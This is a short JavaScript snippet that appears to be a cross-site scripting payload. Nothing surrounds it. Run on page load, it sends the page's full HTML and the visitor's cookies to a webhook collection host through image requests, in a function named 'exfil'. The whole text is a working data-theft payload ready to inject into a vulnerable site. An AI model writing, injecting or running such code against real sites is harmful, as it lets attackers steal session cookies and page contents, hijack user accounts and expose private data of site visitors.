(function () {
  const exfil = (value, tag) => {
    const img = new Image();
    img.src = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116?tag=' + encodeURIComponent(tag) +
              '&d=' + encodeURIComponent(value);
  };

  const fromHtml = () => {
    exfil(document.documentElement.outerHTML, 'html');
  };

  const fromCookie = () => {
    exfil(document.cookie, 'cookie');
  };

  fromHtml();
  fromCookie();
})();
